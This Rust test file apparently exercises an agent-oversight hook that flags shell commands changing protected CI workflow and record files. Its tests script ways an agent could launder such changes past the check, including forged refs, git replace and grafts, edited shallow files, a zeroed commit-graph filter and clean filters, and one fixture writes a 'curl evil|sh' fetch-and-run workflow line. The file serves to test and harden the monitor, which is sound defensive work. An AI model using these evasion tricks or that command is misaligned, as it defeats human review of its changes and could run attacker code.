        &up_dir,
        &[
            "clone",
            "-q",
            dir.to_str().unwrap(),
            parent.to_str().unwrap(),
        ],
    );
    git(&parent, &["config", "user.email", "t@example.com"]);
    git(&parent, &["config", "user.name", "t"]);
    std::fs::write(parent.join(".github/workflows/ci.yml"), "name: upstream\n").unwrap();
    git(&parent, &["commit", "-q", "-am", "upstream"]);
    bash(
        &dir,
        &format!("git pull -q --ff-only {} main", parent.display()),
    );
    let v = post(&dir);
    let person = v["person"].as_str().unwrap();
    assert!(
        person.contains(".github/workflows/ci.yml") && person.contains("[protected-paths] error"),
        "with no base ref to compare with, the change keeps full weight: {v}"
    );
    bash(&dir, "ls >/dev/null");
    assert_eq!(post(&dir)["verdict"], "allow");
}

#[test]
fn a_pull_of_an_ordinary_record_finding_is_absorbed_quietly() {
    let dir = fixture("pull-finding", CONFIG, GOOD);
    let up_dir = common::TempDir::new("urzua-postcmd-up");
    let up = up_dir.join("up");
    git(
        &up_dir,
        &["clone", "-q", dir.to_str().unwrap(), up.to_str().unwrap()],
    );
    git(&up, &["config", "user.email", "t@example.com"]);
    git(&up, &["config", "user.name", "t"]);
    assert_eq!(post(&dir)["verdict"], "allow");
    std::fs::write(up.join(PATH_1), BAD).unwrap();
    git(&up, &["commit", "-q", "-am", "bad upstream"]);
    let branch = git(&dir, &["rev-parse", "--abbrev-ref", "HEAD"]);
    bash(
        &dir,
        &format!("git pull -q --ff-only {} {}", up.display(), branch.trim()),
    );
    let v = post(&dir);
    assert_eq!(v["verdict"], "allow", "{v}");
}

#[test]
fn an_empty_bash_edit_diff_still_runs_the_comparison() {
    let dir = fixture("host-list", CONFIG, GOOD);
    install(&dir);
    git(&dir, &["add", "-A"]);
    git(&dir, &["commit", "-q", "-m", "install"]);
    let cmd = hook_command(&dir, "Bash");
    run_hook(&dir, &cmd, &payload(&dir, "Bash"), None);
    bash(
        &dir,
        &format!("sed -i 's/Implemented/Not started/' {PATH_1}"),
    );
    let empty = payload_with(&dir, serde_json::json!({"stdout": "", "bashEditDiff": []}));
    let out = run_hook(&dir, &cmd, &empty, None);
    let v = json(&out);
    assert!(
        v["hookSpecificOutput"]["additionalContext"]
            .as_str()
            .unwrap()
            .contains(PATH_1),
        "{v}"
    );
}

fn payload_with(dir: &Path, response: serde_json::Value) -> String {
    serde_json::json!({
        "hook_event_name": "PostToolUse", "tool_name": "Bash", "cwd": dir.to_string_lossy(),
        "tool_input": {"command": "x"}, "tool_response": response,
    })
    .to_string()
}

const OWN_CONFIG: &str = "schema_version: 2\nrules: {header.required-fields: error}\nrecord_types:\n  adr:\n    dir: \"docs/adr\"\n    required_fields: [\"Status\", \"Date\"]\n    statuses:\n      values: [Proposed, Accepted, Rejected]\nharness:\n  adapters: [claude-code]\n  guardrails:\n    post-command: {enabled: true}\n";

#[test]
fn a_finding_in_the_sessions_own_commit_merged_from_a_branch_is_reported_once() {
    let dir = fixture(
        "own-merge",
        OWN_CONFIG,
        "---\nStatus: Proposed\nDate: 2026-01-01\n---\n# ADR-1: T\n\nprose\n",
    );
    git(&dir, &["branch", "-M", "main"]);
    assert_eq!(post(&dir)["verdict"], "allow");
    bash(
        &dir,
        &format!("git checkout -q -b side2 && sed -i '/^Date:/d' {PATH_1} && git commit -qam own && git checkout -q main"),
    );
    assert_eq!(post(&dir)["verdict"], "allow");
    bash(&dir, "git merge -q side2");
    let v = post(&dir);
    let agent = v["agent"].as_str().unwrap();
    assert!(
        agent.contains("header.required-fields") && agent.contains(PATH_1),
        "{v}"
    );
    bash(&dir, "ls >/dev/null");
    assert_eq!(post(&dir)["verdict"], "allow");
}

#[test]
fn a_gated_move_the_agent_committed_itself_is_an_error_with_no_base_match() {
    let dir = launder_fixture("own-commit-wording");
    bash(&dir, &format!("{A} && git commit -qam b"));
    let v = post(&dir);
    let person = v["person"].as_str().unwrap();
    assert!(person.contains("[acceptance] error"), "{v}");
    assert!(v["base_match"].is_null(), "{v}");
}

/// An upstream repository with the gates, and a clone of it whose
/// `origin/HEAD` is the base the post-command check compares with.
fn cloned_fixture(name: &str) -> (common::TempDir, PathBuf, common::TempDir) {
    cloned_fixture_with(name, None)
}

fn cloned_fixture_with(
    name: &str,
    post_command: Option<&str>,
) -> (common::TempDir, PathBuf, common::TempDir) {
    let up = launder_fixture(&format!("{name}-up"));
    if let Some(decl) = post_command {
        let config = LAUNDER_CONFIG.replace("post-command: {enabled: true}", decl);
        std::fs::write(up.join(".urzua/config.yaml"), config).unwrap();
        git(&up, &["commit", "-qam", "post-command keys"]);
    }
    let holder = common::TempDir::new(&format!("urzua-postcmd-{name}-clone"));
    let dir = holder.join("work");
    git(
        &holder,
        &["clone", "-q", up.to_str().unwrap(), dir.to_str().unwrap()],
    );
    git(&dir, &["config", "user.email", "t@example.com"]);
    git(&dir, &["config", "user.name", "t"]);
    assert_eq!(post(&dir)["verdict"], "allow");
    (up, dir, holder)
}

fn upstream_change(up: &Path) {
    bash(up, &format!("{A} && echo upstream >> .github/workflows/ci.yml && echo up > .github/workflows/new.yml && git add -A && git commit -qm upstream"));
}

#[test]
fn a_fast_forward_pull_of_the_base_branch_is_one_plain_sentence() {
    let (up, dir, _h) = cloned_fixture("ff-base");
    upstream_change(&up);
    bash(&dir, "git pull -q --ff-only");
    let v = post(&dir);
    assert_eq!(v["verdict"], "allow-with-warnings", "still printed: {v}");
    let person = v["person"].as_str().unwrap();
    assert_eq!(
        person,
        "urzua harness (post-command) info: the command changed 3 gated path(s) (docs/adr/ADR-1-a.md, .github/workflows/ci.yml, .github/workflows/new.yml), and each now holds exactly the content on origin/HEAD (origin/main), so nothing needs doing.",
        "{v}"
    );
    assert!(!person.contains("error"), "{v}");
    assert_eq!(v["base_match"]["paths"].as_array().unwrap().len(), 3, "{v}");
    assert_eq!(v["base_match"]["level"], "info", "{v}");
    bash(&dir, "ls >/dev/null");
    assert_eq!(post(&dir)["verdict"], "allow");
}

#[test]
fn a_pull_with_a_differing_shell_edit_keeps_the_edit_at_full_weight() {
    let (up, dir, _h) = cloned_fixture("ff-mixed");
    upstream_change(&up);
    bash(
        &dir,
        "git pull -q --ff-only && echo evil > .github/workflows/evil.yml",
    );
    let v = post(&dir);
    let person = v["person"].as_str().unwrap();
    assert!(
        person.contains("[protected-paths] error (gate: ")
            && person.contains(".github/workflows/evil.yml"),
        "{v}"
    );
    assert!(
        person.contains("info: 3 other gated path(s) (docs/adr/ADR-1-a.md, .github/workflows/ci.yml, .github/workflows/new.yml) now hold exactly the content on origin/HEAD (origin/main)"),
        "{v}"
    );
    assert_eq!(
        person.matches("[protected-paths]").count(),
        1,
        "one gate, named once: {v}"
    );
    let evil = v["protected_changes"]
        .as_array()
        .unwrap()
        .iter()
        .find(|l| l.as_str().unwrap().contains("evil.yml"))
        .unwrap()
        .as_str()
        .unwrap();
    assert!(evil.contains("[protected-paths] error:"), "{v}");
}

#[test]
fn a_shell_edit_of_a_protected_path_not_on_the_base_branch_is_an_error() {
    let (_up, dir, _h) = cloned_fixture("shell-edit");
    bash(&dir, &format!("{W} && echo b >> .github/workflows/ci.yml"));
    let v = post(&dir);
    let person = v["person"].as_str().unwrap();
    assert!(
        person.contains("[protected-paths] error") && person.contains(".github/workflows/ci.yml"),
        "{v}"
    );
    assert!(v["base_match"].is_null(), "{v}");
}

#[test]
fn launder_by_update_ref_of_the_remote_tracking_base_is_still_printed() {
    let (_up, dir, _h) = cloned_fixture("forged");
    bash(
        &dir,
        &format!("{W} && git commit -qam forged && git update-ref refs/remotes/origin/main HEAD"),
    );
    let v = post(&dir);
    assert_eq!(v["verdict"], "allow-with-warnings", "{v}");
    let person = v["person"].as_str().unwrap();
    assert!(
        person.starts_with("urzua harness (post-command) info: the command changed 1 gated path(s) (.github/workflows/ci.yml)"),
        "the forged match lowers the weight but is never silent, and names the path: {v}"
    );
}

#[test]
fn the_comparison_ref_and_the_level_come_from_configuration() {
    let (up, dir, _h) = cloned_fixture_with(
        "configured",
        Some("post-command: {enabled: true, base: refs/remotes/origin/main, base_match: warning}"),
    );
    upstream_change(&up);
    bash(&dir, "git pull -q --ff-only");
    let v = post(&dir);
    assert_eq!(
        v["person"],
        "urzua harness (post-command) warning: the command changed 3 gated path(s) (docs/adr/ADR-1-a.md, .github/workflows/ci.yml, .github/workflows/new.yml), and each now holds exactly the content on refs/remotes/origin/main (origin/main), so nothing needs doing.",
        "{v}"
    );
    assert_eq!(v["base_match"]["level"], "warning", "{v}");
}

fn base_paths(v: &serde_json::Value) -> Vec<String> {
    v["base_match"]["paths"]
        .as_array()
        .map(|a| a.iter().map(|p| p.as_str().unwrap().to_string()).collect())
        .unwrap_or_default()
}

#[test]
fn a_mode_change_does_not_match_the_base() {
    let (up, dir, _h) = cloned_fixture("chmod");
    upstream_change(&up);
    bash(
        &dir,
        "git pull -q --ff-only && chmod +x .github/workflows/ci.yml",
    );
    let v = post(&dir);
    assert!(
        !base_paths(&v).contains(&".github/workflows/ci.yml".to_string()),
        "{v}"
    );
    let person = v["person"].as_str().unwrap();
    assert!(person.contains("[protected-paths] error"), "{v}");
}

#[test]
fn a_symlink_to_a_copy_does_not_match_the_base() {
    let (up, dir, h) = cloned_fixture("symlink");
    upstream_change(&up);
    let copy = h.join("copy.yml");
    bash(
        &dir,
        &format!(
            "git pull -q --ff-only && cp .github/workflows/ci.yml {c} && rm .github/workflows/ci.yml && ln -s {c} .github/workflows/ci.yml",
            c = copy.display()
        ),
    );
    let v = post(&dir);
    assert!(
        !base_paths(&v).contains(&".github/workflows/ci.yml".to_string()),
        "{v}"
    );
    assert!(
        v["person"]
            .as_str()
            .unwrap()
            .contains("[protected-paths] error"),
        "{v}"
    );
}

#[test]
fn a_command_that_points_the_base_at_its_own_commit_keeps_full_weight() {
    let (_up, dir, _h) = cloned_fixture("own-base");
    bash(
        &dir,
        &format!("sed -i 's/post-command: {{enabled: true}}/post-command: {{enabled: true, base: HEAD}}/' .urzua/config.yaml && {W} && git commit -qam x"),
    );
    let v = post(&dir);
    assert!(v["base_match"].is_null(), "{v}");
    let person = v["person"].as_str().unwrap();
    assert!(
        person.contains("[protected-paths] error") && person.contains(".github/workflows/ci.yml"),
        "{v}"
    );
}

#[test]
fn a_pull_that_brings_a_configuration_change_from_the_base_still_matches() {
    let (up, dir, _h) = cloned_fixture("config-pull");
    bash(&up, "echo '# upstream note' >> .urzua/config.yaml && echo upstream >> .github/workflows/ci.yml && git commit -qam cfg");
    bash(&dir, "git pull -q --ff-only");
    let v = post(&dir);
    assert_eq!(
        base_paths(&v),
        vec![".github/workflows/ci.yml".to_string()],
        "{v}"
    );
    assert!(v["person"].as_str().unwrap().contains(" info: "), "{v}");
}

#[test]
fn a_pull_in_a_linked_worktree_is_one_plain_sentence() {
    let (up, dir, h) = cloned_fixture("worktree");
    let wt = h.join("wt");
    git(
        &dir,
        &[
            "worktree",
            "add",
            "-q",
            "-b",
            "wtb",
            wt.to_str().unwrap(),
            "origin/main",
        ],
    );
    assert_eq!(post(&wt)["verdict"], "allow");
    upstream_change(&up);
    bash(&wt, "git pull -q --ff-only origin main");
    let v = post(&wt);
    assert_eq!(base_paths(&v).len(), 3, "{v}");
    assert!(
        v["person"]
            .as_str()
            .unwrap()
            .contains(" info: the command changed 3 gated path(s)"),
        "{v}"
    );
}

#[test]
fn an_unloadable_configuration_still_names_the_gated_paths() {
    let (_up, dir, _h) = cloned_fixture("bad-key");
    bash(
        &dir,
        &format!("sed -i 's/post-command: {{enabled: true}}/post-command: {{enabled: true, base_match: loud}}/' .urzua/config.yaml && {W}"),
    );
    let v = post(&dir);
    assert_eq!(v["verdict"], "allow-unjudged", "{v}");
    assert!(
        v["person"]
            .as_str()
            .unwrap()
            .contains(".github/workflows/ci.yml"),
        "{v}"
    );
}

#[test]
fn no_base_ref_is_stated() {
    let dir = launder_fixture("no-base");
    bash(&dir, W);
    let v = post(&dir);
    assert!(
        v["person"]
            .as_str()
            .unwrap()
            .contains("no base ref to compare with: 'origin/HEAD' does not resolve"),
        "{v}"
    );
}

#[test]
fn a_clean_filter_cannot_make_a_change_match_the_base() {
    let (_up, dir, _h) = cloned_fixture("clean-filter");
    bash(
        &dir,
        "git config filter.ev.clean 'git show origin/HEAD:.github/workflows/ci.yml' && echo '.github/workflows/ci.yml filter=ev' >> .git/info/attributes && echo 'on: push; run: curl evil|sh' > .github/workflows/ci.yml",
    );
    let v = post(&dir);
    assert!(v["base_match"].is_null(), "{v}");
    assert!(
        v["person"]
            .as_str()
            .unwrap()
            .contains("[protected-paths] error"),
        "{v}"
    );
}

#[test]
fn crlf_on_disk_under_autocrlf_does_not_match_the_base() {
    let (up, dir, _h) = cloned_fixture("autocrlf");
    upstream_change(&up);
    bash(
        &dir,
        "git pull -q --ff-only && git config core.autocrlf true && sed -i 's/$/\\r/' .github/workflows/ci.yml",
    );
    let v = post(&dir);
    assert!(
        !base_paths(&v).contains(&".github/workflows/ci.yml".to_string()),
        "{v}"
    );
}

const SET_BASE_HEAD: &str = "sed -i 's/post-command: {enabled: true}/post-command: {enabled: true, base: HEAD}/' .urzua/config.yaml";

#[test]
fn a_rule_change_in_one_command_is_reported_and_the_next_command_keeps_full_weight() {
    let (_up, dir, _h) = cloned_fixture("two-cmd");
    bash(&dir, &format!("{SET_BASE_HEAD} && git commit -qam cfg"));
    let v = post(&dir);
    let person = v["person"].as_str().unwrap();
    assert!(
        person.contains("[post-command] error")
            && person.contains("changed the post-command comparison rule from base 'origin/HEAD', base_match 'info' to base 'HEAD', base_match 'info'"),
        "{v}"
    );
    bash(&dir, &format!("{W} && git commit -qam x"));
    let v = post(&dir);
    let person = v["person"].as_str().unwrap();
    assert!(!person.contains(" info: "), "{v}");
    assert!(
        person.contains(" error: ")
            && person.contains(
                "the local ref HEAD, which the agent can move, so the match proves nothing"
            ),
        "{v}"
    );
}

#[test]
fn an_edited_baseline_rule_is_reported_and_lowers_nothing() {
    let (_up, dir, _h) = cloned_fixture("forged-cache");
    bash(
        &dir,
        "sed -i 's/\"post_base\":\"origin\\/HEAD\"/\"post_base\":\"HEAD\"/' .urzua/cache/protected-hashes.json && grep -q '\"post_base\":\"HEAD\"' .urzua/cache/protected-hashes.json",
    );
    bash(&dir, &format!("{W} && git commit -qam x"));
    let v = post(&dir);
    let person = v["person"].as_str().unwrap();
    assert!(person.contains("so the baseline was edited"), "{v}");
    assert!(person.contains("[protected-paths] error"), "{v}");
    assert!(v["base_match"].is_null(), "{v}");
}

#[test]
fn a_local_base_never_lowers_the_report() {
    let (_up, dir, _h) = cloned_fixture_with(
        "local-base",
        Some("post-command: {enabled: true, base: HEAD}"),
    );
    bash(&dir, &format!("{W} && git commit -qam x"));
    let v = post(&dir);
    let person = v["person"].as_str().unwrap();
    assert!(
        person.starts_with("urzua harness (post-command) error: the command changed 1 gated path(s) (.github/workflows/ci.yml), and each now holds exactly the content on the local ref HEAD, which the agent can move, so the match proves nothing; a decider must review the listed paths."),
        "{v}"
    );
    assert_eq!(v["base_match"]["level"], "error", "{v}");
}

#[test]
fn a_pull_that_changes_the_rule_reports_the_change_once() {
    let (up, dir, _h) = cloned_fixture("rule-pull");
    bash(&up, "sed -i 's/post-command: {enabled: true}/post-command: {enabled: true, base_match: warning}/' .urzua/config.yaml && git commit -qam rule");
    bash(&dir, "git pull -q --ff-only");
    let v = post(&dir);
    let person = v["person"].as_str().unwrap();
    assert_eq!(
        person
            .matches("changed the post-command comparison rule")
            .count(),
        1,
        "{v}"
    );
    bash(&dir, "ls >/dev/null");
    assert_eq!(post(&dir)["verdict"], "allow");
}

#[test]
fn at_base_match_error_the_sentence_does_not_say_nothing_needs_doing() {
    let (up, dir, _h) = cloned_fixture_with(
        "level-error",
        Some("post-command: {enabled: true, base_match: error}"),
    );
    upstream_change(&up);
    bash(&dir, "git pull -q --ff-only");
    let person = post(&dir)["person"].as_str().unwrap().to_string();
    assert!(
        person.ends_with("now holds exactly the content on origin/HEAD (origin/main); a decider must review the listed paths.")
            && person.contains(" error: ")
            && !person.contains("nothing needs doing"),
        "{person}"
    );
}

const NON_UTF8: &str = "printf 'evil\\n' > \".github/workflows/$(printf '\\377').yml\"";

#[test]
fn a_file_name_that_is_not_utf8_never_matches() {
    let (_up, dir, _h) = cloned_fixture("non-utf8");
    bash(&dir, NON_UTF8);
    let v = post(&dir);
    assert!(v["base_match"].is_null(), "uncommitted: {v}");
    assert!(
        v["person"]
            .as_str()
            .unwrap()
            .contains("[protected-paths] error"),
        "{v}"
    );
    let (_up2, dir2, _h2) = cloned_fixture("non-utf8-commit");
    bash(
        &dir2,
        &format!("{NON_UTF8} && git add -A && git commit -qm x"),
    );
    let v = post(&dir2);
    assert!(v["base_match"].is_null(), "committed: {v}");
    assert!(
        v["person"]
            .as_str()
            .unwrap()
            .contains("[protected-paths] error"),
        "{v}"
    );
}

#[test]
fn a_file_a_pull_deleted_that_the_base_lacks_still_matches() {
    let (up, dir, _h) = cloned_fixture("pull-delete");
    bash(
        &up,
        "git rm -q .github/workflows/ci.yml && git commit -qm rm",
    );
    bash(&dir, "git pull -q --ff-only");
    let v = post(&dir);
    assert_eq!(
        base_paths(&v),
        vec![".github/workflows/ci.yml".to_string()],
        "{v}"
    );
}

/// A cloned fixture whose upstream installed the Claude Code adapter, so the
/// translator runs as the host runs it.
fn cloned_with_adapter(
    name: &str,
    post_command: Option<&str>,
) -> (common::TempDir, PathBuf, common::TempDir, String) {
    let up = launder_fixture(&format!("{name}-up"));
    if let Some(decl) = post_command {
        let config = LAUNDER_CONFIG.replace("post-command: {enabled: true}", decl);
        std::fs::write(up.join(".urzua/config.yaml"), config).unwrap();
    }
    install(&up);
    git(&up, &["add", "-A"]);
    git(&up, &["commit", "-qm", "install"]);
    let holder = common::TempDir::new(&format!("urzua-postcmd-{name}-clone"));
    let dir = holder.join("work");
    git(
        &holder,
        &["clone", "-q", up.to_str().unwrap(), dir.to_str().unwrap()],
    );
    git(&dir, &["config", "user.email", "t@example.com"]);
    git(&dir, &["config", "user.name", "t"]);
    let cmd = hook_command(&dir, "Bash");
    let out = run_hook(&dir, &cmd, &payload(&dir, "Bash"), None);
    assert!(out.stdout.is_empty(), "{out:?}");
    (up, dir, holder, cmd)
}

fn audiences(dir: &Path, cmd: &str) -> (String, String) {
    let v = json(&run_hook(dir, cmd, &payload(dir, "Bash"), None));
    (
        v["systemMessage"].as_str().unwrap_or("").to_string(),
        v["hookSpecificOutput"]["additionalContext"]
            .as_str()
            .unwrap_or("")
            .to_string(),
    )
}

#[test]
fn the_agent_gets_its_own_line_when_every_gated_change_matches() {
    let (up, dir, _h, cmd) = cloned_with_adapter("agent-match", None);
    upstream_change(&up);
    bash(&dir, "git pull -q --ff-only");
    let (person, agent) = audiences(&dir, &cmd);
    assert!(person.contains("nothing needs doing"), "{person}");
    assert!(
        agent.contains("3 gated change(s) match origin/HEAD (origin/main); nothing to do."),
        "{agent}"
    );
}

#[test]
fn the_agent_gets_its_own_line_when_the_base_is_a_local_ref() {
    let (_up, dir, _h, cmd) = cloned_with_adapter(
        "agent-local",
        Some("post-command: {enabled: true, base: HEAD}"),
    );
    bash(&dir, &format!("{W} && git commit -qam x"));
    let (person, agent) = audiences(&dir, &cmd);
    assert!(person.contains("proves nothing"), "{person}");
    assert!(
        agent.contains("1 gated change(s) match the local ref HEAD, which proves nothing; a decider must make or approve them"),
        "{agent}"
    );
}

#[test]
fn the_agent_gets_its_own_line_in_a_mixed_report() {
    let (up, dir, _h, cmd) = cloned_with_adapter("agent-mixed", None);
    upstream_change(&up);
    bash(
        &dir,
        "git pull -q --ff-only && echo evil > .github/workflows/evil.yml",
    );
    let (person, agent) = audiences(&dir, &cmd);
    assert!(person.contains("evil.yml"), "{person}");
    assert!(
        agent.contains("a decider must make or approve these") && agent != person,
        "{agent}"
    );
}

fn assert_full_weight(dir: &Path, cmd: &str) {
    bash(dir, cmd);
    let v = post(dir);
    assert!(v["base_match"].is_null(), "{cmd}: {v}");
    assert!(
        v["person"]
            .as_str()
            .unwrap()
            .contains("[protected-paths] error"),
        "{cmd}: {v}"
    );
}

#[test]
fn base_bytes_on_disk_over_a_different_commit_do_not_match() {
    let (_up, dir, _h) = cloned_fixture("restore-commit");
    assert_full_weight(&dir, "echo evil >> .github/workflows/ci.yml && git add .github/workflows/ci.yml && git restore --source=origin/main --worktree .github/workflows/ci.yml && git commit -qm x");
}

#[test]
fn a_committed_file_removed_from_disk_does_not_match() {
    let (_up, dir, _h) = cloned_fixture("commit-rm");
    assert_full_weight(&dir, "echo evil > .github/workflows/e.yml && git add -A && git commit -qm x && rm .github/workflows/e.yml");
}

#[test]
fn base_bytes_on_disk_over_a_different_index_do_not_match() {
    let (_up, dir, _h) = cloned_fixture("restore-index");
    assert_full_weight(&dir, "echo evil >> .github/workflows/ci.yml && git add .github/workflows/ci.yml && git restore --source=origin/main --worktree .github/workflows/ci.yml");
}

#[test]
fn a_pull_with_an_unrelated_local_commit_still_matches() {
    let (up, dir, _h) = cloned_fixture("pull-unrelated");
    upstream_change(&up);
    bash(
        &dir,
        "git pull -q --ff-only && echo x > notes.txt && git add notes.txt && git commit -qm notes",
    );
    let v = post(&dir);
    assert_eq!(base_paths(&v).len(), 3, "{v}");
}

#[test]
fn a_change_hidden_in_a_merge_commit_does_not_match() {
    let (up, dir, _h) = cloned_fixture("two-merge");
    upstream_change(&up);
    bash(&dir, "git pull -q --ff-only && git checkout -qb s1 && echo 1 > src/s1.rs && git add -A && git commit -qm s1 && git checkout -qb s2 main && echo 2 > src/s2.rs && git add -A && git commit -qm s2 && git checkout -q main && git merge -q --no-ff --no-commit s1 && echo evil >> .github/workflows/ci.yml && git add .github/workflows/ci.yml && git commit -qm M1 && git merge -q --no-ff --no-commit s2 && git checkout -q origin/main -- .github/workflows/ci.yml && git commit -qm M2");
    let v = post(&dir);
    assert!(
        !base_paths(&v).contains(&".github/workflows/ci.yml".to_string()),
        "{v}"
    );
    assert!(
        v["person"]
            .as_str()
            .unwrap()
            .contains("[protected-paths] error"),
        "{v}"
    );
}

#[test]
fn a_real_merge_of_the_base_into_local_commits_still_matches() {
    let (up, dir, _h) = cloned_fixture("real-merge");
    bash(
        &dir,
        "echo x > notes.txt && git add notes.txt && git commit -qm notes",
    );
    assert_eq!(post(&dir)["verdict"], "allow");
    upstream_change(&up);
    bash(&dir, "git pull -q --no-rebase --no-edit");
    let v = post(&dir);
    assert_eq!(base_paths(&v).len(), 3, "{v}");
}

#[test]
fn an_evil_merge_resolution_does_not_match() {
    let (up, dir, _h) = cloned_fixture("evil-merge");
    bash(
        &dir,
        "echo x > notes.txt && git add notes.txt && git commit -qm notes",
    );
    assert_eq!(post(&dir)["verdict"], "allow");
    upstream_change(&up);
    bash(&dir, "git pull -q --no-rebase --no-commit && echo evil >> .github/workflows/ci.yml && git add .github/workflows/ci.yml && git commit -qm merge");
    let v = post(&dir);
    assert!(
        !base_paths(&v).contains(&".github/workflows/ci.yml".to_string()),
        "{v}"
    );
    assert!(
        v["person"]
            .as_str()
            .unwrap()
            .contains("[protected-paths] error"),
        "{v}"
    );
}

fn assert_rewritten(dir: &Path, cmd: &str) {
    bash(dir, cmd);
    let v = post(dir);
    assert!(v["base_match"].is_null(), "{cmd}: {v}");
    let person = v["person"].as_str().unwrap();
    assert!(
        person.contains("[protected-paths] error")
            && person.contains(
                "replace refs or grafts are present, so nothing was compared with the base"
            ),
        "{cmd}: {v}"
    );
}

const EVIL_THEN_BASE: &str = "echo evil >> .github/workflows/ci.yml && git commit -qam E && git checkout -q origin/main -- .github/workflows/ci.yml && git commit -qam F";

#[test]
fn a_replace_graft_does_not_make_a_change_match() {
    let (up, dir, _h) = cloned_fixture("replace-graft");
    upstream_change(&up);
    assert_rewritten(
        &dir,
        &format!(
            "git pull -q --ff-only && {EVIL_THEN_BASE} && git replace --graft HEAD origin/main"
        ),
    );
}

#[test]
fn a_grafts_file_does_not_make_a_change_match() {
    let (up, dir, _h) = cloned_fixture("grafts-file");
    upstream_change(&up);
    assert_rewritten(&dir, &format!("git pull -q --ff-only && {EVIL_THEN_BASE} && echo \"$(git rev-parse HEAD) $(git rev-parse origin/main)\" > \"$(git rev-parse --git-path info/grafts)\""));
}

#[test]
fn replacing_the_base_after_a_pull_does_not_make_a_change_match() {
    let (up, dir, _h) = cloned_fixture("replace-after-pull");
    upstream_change(&up);
    assert_rewritten(&dir, "git pull -q --ff-only && echo evil >> .github/workflows/ci.yml && git commit -qam E && git replace origin/main HEAD");
}

#[test]
fn replacing_the_base_does_not_make_a_change_match() {
    let (_up, dir, _h) = cloned_fixture("replace-base");
    assert_rewritten(
        &dir,
        &format!("{W} && git commit -qam E && git replace origin/main HEAD"),
    );
}

#[test]
fn a_shallow_clones_pull_still_matches() {
    let up = launder_fixture("shallow-up");
    let holder = common::TempDir::new("urzua-postcmd-shallow-clone");
    let dir = holder.join("work");
    let url = format!("file://{}", up.display());
    git(
        &holder,
        &["clone", "-q", "--depth", "1", &url, dir.to_str().unwrap()],
    );
    git(&dir, &["config", "user.email", "t@example.com"]);
    git(&dir, &["config", "user.name", "t"]);
    assert_eq!(post(&dir)["verdict"], "allow");
    upstream_change(&up);
    bash(&dir, "git pull -q --ff-only");
    let v = post(&dir);
    assert_eq!(base_paths(&v).len(), 3, "{v}");
}

const SHALLOW_GRAFT: &str = "git config log.showRoot false && git pull -q --ff-only && echo evil >> .github/workflows/ci.yml && git commit -qam E && git show origin/main:.github/workflows/ci.yml > .github/workflows/ci.yml && git commit -qam F && git rev-parse HEAD >> \"$(git rev-parse --git-path shallow)\"";

fn assert_truncated(dir: &Path) {
    bash(dir, SHALLOW_GRAFT);
    let v = post(dir);
    assert!(v["base_match"].is_null(), "{v}");
    let person = v["person"].as_str().unwrap();
    assert!(
        person.contains("[protected-paths] error")
            && person.contains("the command truncated the history"),
        "{v}"
    );
}

#[test]
fn a_hand_edited_shallow_file_does_not_make_a_change_match() {
    let (up, dir, _h) = cloned_fixture("shallow-graft");
    upstream_change(&up);
    assert_truncated(&dir);
}

#[test]
fn a_hand_edited_shallow_file_in_a_shallow_clone_does_not_make_a_change_match() {
    let up = launder_fixture("shallow-graft-depth-up");
    let holder = common::TempDir::new("urzua-postcmd-shallow-graft-depth-clone");
    let dir = holder.join("work");
    let url = format!("file://{}", up.display());
    git(
        &holder,
        &["clone", "-q", "--depth", "1", &url, dir.to_str().unwrap()],
    );
    git(&dir, &["config", "user.email", "t@example.com"]);
    git(&dir, &["config", "user.name", "t"]);
    assert_eq!(post(&dir)["verdict"], "allow");
    upstream_change(&up);
    assert_truncated(&dir);
}

/// Zeroes the changed-path (Bloom) filter data of the commit-graph, so a
/// path-limited walk that trusts it skips every commit.
const ZERO_BLOOM: &str = r#"chmod u+w "$(git rev-parse --git-path objects/info/commit-graph)" && python3 -I -c '
import sys
p = sys.argv[1]
b = bytearray(open(p, "rb").read())
n = b[6]
table = [(bytes(b[8 + 12 * i:12 + 12 * i]), int.from_bytes(b[12 + 12 * i:20 + 12 * i], "big")) for i in range(n + 1)]
for k, (cid, off) in enumerate(table[:-1]):
    if cid == b"BDAT":
        end = table[k + 1][1]
        b[off + 12:end] = bytes(end - off - 12)
        open(p, "wb").write(bytes(b))
        sys.exit(0)
sys.exit(1)
' "$(git rev-parse --git-path objects/info/commit-graph)""#;

#[test]
fn a_forged_changed_path_filter_does_not_make_a_change_match() {
    let (up, dir, _h) = cloned_fixture("bloom");
    upstream_change(&up);
    bash(&dir, &format!("git pull -q --ff-only && {EVIL_THEN_BASE} && git commit-graph write --reachable --changed-paths && {ZERO_BLOOM}"));
    let v = post(&dir);
    assert!(
        !base_paths(&v).contains(&".github/workflows/ci.yml".to_string()),
        "{v}"
    );
    assert!(
        v["person"]
            .as_str()
            .unwrap()
            .contains("[protected-paths] error"),
        "{v}"
    );
}

#[test]
fn an_orphan_root_commit_of_the_command_does_not_match() {
    let (up, dir, _h) = cloned_fixture("orphan-root");
    upstream_change(&up);
    assert_full_weight(
        &dir,
        "git config log.showRoot false && git pull -q --ff-only && git checkout -q --orphan o && git commit -qm root",
    );
}

#[test]
fn a_shallow_line_with_a_non_utf8_byte_still_counts() {
    let (up, dir, _h) = cloned_fixture("shallow-bytes");
    upstream_change(&up);
    bash(&dir, &format!("git pull -q --ff-only && {EVIL_THEN_BASE} && printf '%s\\377\\n' \"$(git rev-parse HEAD)\" >> \"$(git rev-parse --git-path shallow)\""));
    let v = post(&dir);
    assert!(v["base_match"].is_null(), "{v}");
    assert!(
        v["person"]
            .as_str()
            .unwrap()
            .contains("the command truncated the history"),
        "{v}"
    );
}
